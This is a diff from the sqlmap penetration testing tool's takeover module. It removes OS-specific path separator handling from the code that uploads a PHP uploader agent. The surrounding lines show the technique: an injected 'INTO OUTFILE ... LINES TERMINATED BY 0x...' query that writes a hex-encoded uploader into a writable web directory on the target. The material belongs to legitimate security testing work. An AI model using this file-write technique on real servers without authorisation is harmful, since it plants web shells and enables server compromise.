@@ -137,14 +137,9 @@ class Takeover(Abstraction, DEP, Metasploit, Registry):
         uploaderName = "uploader.php"
         uploaderStr  = fileToStr("%s/%s" % (paths.SQLMAP_SHELL_PATH, uploaderName))
 
-        if kb.os == "Windows":
-            sep = "\\\\"
-        else:
-            sep = "/"
-
         for directory in directories:
             # Upload the uploader agent
-            outFile     = os.path.normpath("%s%s%s" % (directory, sep, uploaderName))
+            outFile     = os.path.normpath("%s/%s" % (directory, uploaderName))
             uplQuery    = uploaderStr.replace("WRITABLE_DIR", directory)
             query       = " LIMIT 1 INTO OUTFILE '%s' " % outFile
             query      += "LINES TERMINATED BY 0x%s --" % hexencode(uplQuery)
